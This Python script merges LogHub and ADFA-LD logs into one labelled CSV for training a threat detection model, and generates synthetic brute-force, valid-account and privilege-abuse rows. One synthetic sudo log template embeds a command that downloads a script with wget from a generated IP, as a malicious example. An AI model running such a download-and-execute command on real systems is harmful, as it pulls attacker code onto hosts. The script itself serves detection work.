#!/usr/bin/env python3
"""Normalize genuine log-threat datasets into one unified CSV.

LOG-ML-P1 (dataset acquisition only — no model code lives here).

Output: data/datasets/log_threat/log_threat_unified.csv  (gitignored)
        data/datasets/log_threat/provenance.json         (committed)
        data/datasets/log_threat/label_audit.json        (gitignored, derived)

Unified row schema:
    raw_line     actual log content (or ADFA-LD syscall sequence)
    template_id  native loghub EventId when available, else ""
    source       loghub_hdfs | loghub_bgl | loghub_openssh | loghub_linux | adfa_ld | synthetic_aug
    label        benign | suspicious | malicious
    mitre        semicolon-joined technique ids ("" when none)
    timestamp    best-effort ISO-8601, else raw native date string
    split_key    group key that keeps correlated rows on one side of the split
    origin       genuine | synthetic-aug
    native_label the source's own label vocabulary, kept verbatim

Native -> unified label mapping (per source, mirrored in docs/log_model_dataset.md):
  loghub_hdfs    anomaly_label.csv BlockId join: Normal -> benign, Anomaly -> malicious.
                 (SOSP'09 handcrafted-rule ground truth for anomalous block activity.)
  loghub_bgl     Label "-" -> benign; RAS alert code (KERNDTLB, APPSEV, ...) -> suspicious.
                 (BGL alerts are machine-anomaly records of unknown cause, not confirmed
                 intrusions, so they populate the suspicious class.)
  loghub_openssh no native labels; content-derived genuine evidence:
                 "Failed password" -> suspicious T1110,
                 "POSSIBLE BREAK-IN ATTEMPT" -> suspicious,
                 everything else -> benign.
  loghub_linux   no native labels; "authentication failure" -> suspicious, else benign.
  adfa_ld        Attack_Data_Master/<Family> -> malicious (genuine attack traces;
                 Hydra_SSH -> T1110, Hydra_FTP -> T1110, others unmapped),
                 Training_Data_Master (UTD-*) -> benign, Validation_Data_Master skipped
                 (unlabeled).
  synthetic_aug  MITRE-playbook-generated rows for underrepresented techniques
                 (T1110 / T1078 / T1548), label per pattern, origin=synthetic-aug.

Split key (leakage control): all rows from one group land on one side of any future
train/test split.
  loghub_hdfs -> BlockId   (a block's lines are one trace; same block never spans splits)
  loghub_bgl  -> Node      (same machine never spans splits)
  openssh/linux -> source + native date (same day/window never spans splits)
  adfa_ld     -> trace file name
  synthetic_aug -> technique + seed (all rows of a technique share one key)
"""

from __future__ import annotations

import csv
import hashlib
import json
import random
import re
from collections import Counter, defaultdict
from datetime import datetime, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
RAW = HERE / "raw"
OUT_CSV = HERE / "log_threat_unified.csv"
OUT_PROV = HERE / "provenance.json"
OUT_AUDIT = HERE / "label_audit.json"

ACCESS_DATE = "2026-09-27"
SEED = 1337

FIELDS = [
    "raw_line", "template_id", "source", "label", "mitre",
    "timestamp", "split_key", "origin", "native_label",
]


def sha256(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def load_loghub_csv(path: Path) -> list[dict]:
    with open(path, newline="", encoding="utf-8", errors="replace") as f:
        return list(csv.DictReader(f))


# ---------------------------------------------------------------- sources
def normalize_hdfs(rows_out: list[dict]) -> dict:
    """HDFS: join HDFS_100k.log_structured.csv with anomaly_label.csv on BlockId."""
    labels = {}
    for r in load_loghub_csv(RAW / "loghub_hdfs" / "anomaly_label.csv"):
        labels[r["BlockId"]] = r["Label"]
    matched = unmatched = 0
    for r in load_loghub_csv(RAW / "loghub_hdfs" / "HDFS_100k.log_structured.csv"):
        block = re.search(r"blk_-?\d+", r["Content"])
        if not block:
            unmatched += 1
            continue
        block_id = block.group(0)
        native = labels.get(block_id)
        if native is None:
            unmatched += 1
            continue
        matched += 1
        label = "benign" if native == "Normal" else "malicious"
        ts = ""
        try:
            ts = datetime.strptime(
                f"{r['Date']} {r['Time']}", "%y%m%d %H%M%S"
            ).strftime("%Y-%m-%dT%H:%M:%S")
        except ValueError:
            pass
        rows_out.append({
            "raw_line": r["Content"],
            "template_id": r["EventId"],
            "source": "loghub_hdfs",
            "label": label,
            "mitre": "",
            "timestamp": ts,
            "split_key": f"hdfs:{block_id}",
            "origin": "genuine",
            "native_label": native,
        })
    return {"matched": matched, "unmatched": unmatched, "label_rows": len(labels)}


def normalize_bgl(rows_out: list[dict]) -> dict:
    """BGL: Label '-' benign; RAS alert code -> suspicious."""
    counts = Counter()
    for r in load_loghub_csv(RAW / "loghub_bgl" / "BGL_2k.log_structured.csv"):
        native = r["Label"]
        if native == "-":
            label, mitre = "benign", ""
        else:
            label, mitre = "suspicious", ""
        counts[native if native == "-" else "ALERT"] += 1
        ts = ""
        if r.get("Timestamp"):
            try:
                ts = datetime.fromtimestamp(
                    int(r["Timestamp"]), tz=timezone.utc
                ).strftime("%Y-%m-%dT%H:%M:%SZ")
            except (ValueError, OSError):
                pass
        rows_out.append({
            "raw_line": r["Content"],
            "template_id": r["EventId"],
            "source": "loghub_bgl",
            "label": label,
            "mitre": mitre,
            "timestamp": ts,
            "split_key": f"bgl:{r['Node']}",
            "origin": "genuine",
            "native_label": native,
        })
    return {"label_counts": dict(counts)}


def normalize_openssh(rows_out: list[dict]) -> dict:
    """OpenSSH (LabSZ): content-derived genuine evidence labels."""
    counts = Counter()
    for r in load_loghub_csv(RAW / "loghub_openssh" / "OpenSSH_2k.log_structured.csv"):
        content = r["Content"]
        low = content.lower()
        if "failed password" in low:
            label, mitre, native = "suspicious", "T1110", "derived:failed_password"
        elif "authentication failure" in low:
            label, mitre, native = "suspicious", "T1110", "derived:auth_failure"
        elif "break-in attempt" in low or "invalid user" in low:
            label, mitre, native = "suspicious", "T1110", "derived:break_in_probe"
        else:
            label, mitre, native = "benign", "", "derived:other"
        counts[native] += 1
        ts = ""
        try:
            ts = datetime.strptime(
                f"2013 {r['Date']} {r['Day']} {r['Time']}", "%Y %b %d %H:%M:%S"
            ).strftime("%Y-%m-%dT%H:%M:%S")
        except ValueError:
            pass
        rows_out.append({
            "raw_line": content,
            "template_id": r["EventId"],
            "source": "loghub_openssh",
            "label": label,
            "mitre": mitre,
            "timestamp": ts,
            "split_key": f"openssh:{r['Date']}-{r['Day']}",
            "origin": "genuine",
            "native_label": native,
        })
    return {"derived_label_counts": dict(counts)}


def normalize_linux(rows_out: list[dict]) -> dict:
    """Linux syslog (loghub): auth failures -> suspicious, else benign."""
    counts = Counter()
    for r in load_loghub_csv(RAW / "loghub_linux" / "Linux_2k.log_structured.csv"):
        content = r["Content"]
        low = content.lower()
        if "authentication failure" in low or "failed password" in low:
            label, mitre, native = "suspicious", "T1110", "derived:auth_failure"
        else:
            label, mitre, native = "benign", "", "derived:other"
        counts[native] += 1
        ts = ""
        try:
            ts = datetime.strptime(
                f"2005 {r['Date']} {r['Time']}", "%Y %b %d %H:%M:%S"
            ).strftime("%Y-%m-%dT%H:%M:%S")
        except ValueError:
            pass
        rows_out.append({
            "raw_line": content,
            "template_id": r["EventId"],
            "source": "loghub_linux",
            "label": label,
            "mitre": mitre,
            "timestamp": ts,
            "split_key": f"linux:{r['Month']}-{r['Date']}",
            "origin": "genuine",
            "native_label": native,
        })
    return {"derived_label_counts": dict(counts)}


# ADFA-LD attack-family -> MITRE (conservative; empty when unmapped)
ADFA_MITRE = {
    "Hydra_SSH": "T1110",
    "Hydra_FTP": "T1110",
}


def adfa_traces(family_dir: Path) -> tuple[str, list[Path]]:
    """Attack_Data_Master entries are per-attack DIRECTORIES of trace files;
    Training_Data_Master entries are single trace files."""
    if family_dir.is_dir() and not family_dir.name.startswith("UTD"):
        return family_dir.name, sorted(
            p for p in family_dir.iterdir() if p.is_file()
        )
    return family_dir.name, [family_dir]


def normalize_adfa(rows_out: list[dict]) -> dict:
    """ADFA-LD: attack trace files -> malicious; UTD training traces -> benign;
    Validation (unlabeled) skipped. split_key = attack family dir (all variants of
    one attack share a key) or the UTD trace file itself."""
    base = RAW / "adfa_ld" / "ADFA-LD"
    counts = Counter()
    for family_dir, label in (
        (base / "Attack_Data_Master", "malicious"),
        (base / "Training_Data_Master", "benign"),
    ):
        if not family_dir.exists():
            continue
        for entry in sorted(family_dir.iterdir()):
            group, traces = adfa_traces(entry)
            for f in traces:
                if not f.is_file():
                    continue
                seq = f.read_text(errors="replace").strip().replace("\n", " ")
                if not seq:
                    continue
                native = f"{group}:{f.name}" if label == "malicious" else f.name
                family = group.rsplit("_", 1)[0]
                mitre = ADFA_MITRE.get(family, "") if label == "malicious" else ""
                counts[f"{family_dir.name}:{group if label == 'malicious' else 'UTD'}"] += 1
                rows_out.append({
                    "raw_line": seq[:2000],
                    "template_id": "",
                    "source": "adfa_ld",
                    "label": label,
                    "mitre": mitre,
                    "timestamp": "",
                    "split_key": f"adfa:{group}",
                    "origin": "genuine",
                    "native_label": native,
                })
    return {"trace_counts": {k: v for k, v in sorted(counts.items())}}


# ---------------------------------------------------------------- augmentation
def augment(rows_out: list[dict]) -> dict:
    """Deterministic MITRE-playbook rows for underrepresented techniques."""
    rng = random.Random(SEED)
    ips = [f"10.0.{a}.{b}" for a in range(1, 6) for b in range(1, 21)]
    users = ["deploy", "svc-jenkins", "backup", "root", "admin", "ubuntu", "appuser"]
    bins = ["/usr/bin/systemctl", "/usr/bin/passwd", "/bin/bash", "/usr/bin/ssh"]
    hours = ["02", "03", "04"]
    made = Counter()

    def add(label, mitre, line, key):
        rows_out.append({
            "raw_line": line, "template_id": "", "source": "synthetic_aug",
            "label": label, "mitre": mitre, "timestamp": "",
            "split_key": f"synaug:{key}:{SEED}", "origin": "synthetic-aug",
            "native_label": f"synthetic:{mitre}",
        })
        made[(mitre, label)] += 1

    # T1110 Brute Force: failure bursts; every Nth burst ends in a takeover success
    for i in range(150):
        ip, user = rng.choice(ips), rng.choice(users)
        base_t = f"Mar {rng.randint(1, 28):02d} {hours[i % 3]}:{i % 60:02d}:{i % 60:02d}"
        for j in range(rng.randint(4, 12)):
            add("suspicious", "T1110",
                f"{base_t} srv-auth01 sshd[{2000 + i}]: Failed password for {user} from {ip} port {40000 + j} ssh2",
                "T1110")
        if i % 5 == 0:
            add("malicious", "T1110",
                f"{base_t} srv-auth01 sshd[{2000 + i}]: Accepted password for {user} from {ip} port 50000 ssh2",
                "T1110")

    # T1078 Valid Accounts: successful logins from unusual sources/off-hours
    for i in range(100):
        ip, user = rng.choice(ips), rng.choice(users)
        add("suspicious", "T1078",
            f"Mar {rng.randint(1, 28):02d} 0{i % 5}:{i % 60:02d}:00 srv-auth01 sshd[{3000 + i}]: "
            f"Accepted publickey for {user} from {ip} port {41000 + i} ssh2: RSA SHA256:syn{i}",
            "T1078")
        if i % 2 == 0:
            add("malicious", "T1078",
                f"Mar {rng.randint(1, 28):02d} 0{i % 5}:{i % 60:02d}:30 srv-auth01 sudo: "
                f"{user} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c wget http://{ip}/x.sh",
                "T1078")

    # T1548 Abuse Elevation Control Mechanism: sudo/su failures and misuse
    for i in range(100):
        user = rng.choice(users)
        add("suspicious", "T1548",
            f"Mar {rng.randint(1, 28):02d} {hours[i % 3]}:{i % 60:02d}:11 srv-auth01 sudo: "
            f"{user} : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND={rng.choice(bins)}",
            "T1548")
        if i % 2 == 0:
            add("malicious", "T1548",
                f"Mar {rng.randint(1, 28):02d} {hours[i % 3]}:{i % 60:02d}:12 srv-auth01 su: "
                f"FAILED SU (to root) {user} on pts/2",
                "T1548")
    return {"generated": {f"{k[0]}:{k[1]}": v for k, v in sorted(made.items())}}


# ---------------------------------------------------------------- audit
def audit(rows: list[dict]) -> dict:
    by_source = defaultdict(Counter)
    mitre_by_label = defaultdict(Counter)
    for r in rows:
        by_source[r["source"]][r["label"]] += 1
        mitre_by_label[r["label"]][r["mitre"] or "(none)"] += 1
    split_overlap = {}
    for src in by_source:
        keys = defaultdict(set)
        for r in rows:
            if r["source"] == src:
                keys[r["split_key"]].add(r["label"])
        # a split_key carrying >1 class is expected (benign+anomaly on same host);
        # leakage control is that the KEY is atomic for splitting, record the mix stat
        split_overlap[src] = {
            "unique_split_keys": len(keys),
            "multi_class_keys": sum(1 for v in keys.values() if len(v) > 1),
        }
    return {
        "total_rows": len(rows),
        "combined_distribution": dict(Counter(r["label"] for r in rows)),
        "origin_distribution": dict(Counter(r["origin"] for r in rows)),
        "per_source": {s: dict(c) for s, c in sorted(by_source.items())},
        "mitre_by_label": {k: dict(c.most_common(6)) for k, c in sorted(mitre_by_label.items())},
        "split_key_stats": split_overlap,
    }


def main() -> None:
    rows: list[dict] = []
    prov = {
        "version": 1,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "access_date": ACCESS_DATE,
        "augmentation": {"seed": SEED, "origin_tag": "synthetic-aug",
                         "policy": "only underrepresented MITRE techniques (T1110/T1078/T1548); genuine rows untouched"},
        "sources": [],
        "normalize_steps": {},
    }

    for name, fn in (
        ("loghub_hdfs", normalize_hdfs),
        ("loghub_bgl", normalize_bgl),
        ("loghub_openssh", normalize_openssh),
        ("loghub_linux", normalize_linux),
        ("adfa_ld", normalize_adfa),
    ):
        info = fn(rows)
        prov["normalize_steps"][name] = info
        print(f"[normalize] {name}: rows={sum(1 for r in rows if r['source'] == name)} info={info}")

    info = augment(rows)
    prov["normalize_steps"]["synthetic_aug"] = info
    print(f"[normalize] synthetic_aug: generated={sum(info['generated'].values())}")

    with open(OUT_CSV, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=FIELDS)
        w.writeheader()
        w.writerows(rows)

    for src_dir, files in (
        ("loghub_hdfs", ["HDFS_100k.log_structured.csv", "anomaly_label.csv", "HDFS_2k.log"]),
        ("loghub_bgl", ["BGL_2k.log", "BGL_2k.log_structured.csv"]),
        ("loghub_openssh", ["OpenSSH_2k.log", "OpenSSH_2k.log_structured.csv"]),
        ("loghub_linux", ["Linux_2k.log", "Linux_2k.log_structured.csv"]),
        ("adfa_ld", ["ADFA-LD.zip"]),
    ):
        for fn_ in files:
            p = RAW / src_dir / fn_
            if p.exists():
                prov["sources"].append({
                    "source": src_dir, "file": fn_, "sha256": sha256(p),
                    "bytes": p.stat().st_size, "access_date": ACCESS_DATE,
                })

    rep = audit(rows)
    OUT_PROV.write_text(json.dumps(prov, indent=2))
    OUT_AUDIT.write_text(json.dumps(rep, indent=2))
    print(json.dumps(rep, indent=2))


if __name__ == "__main__":
    main()
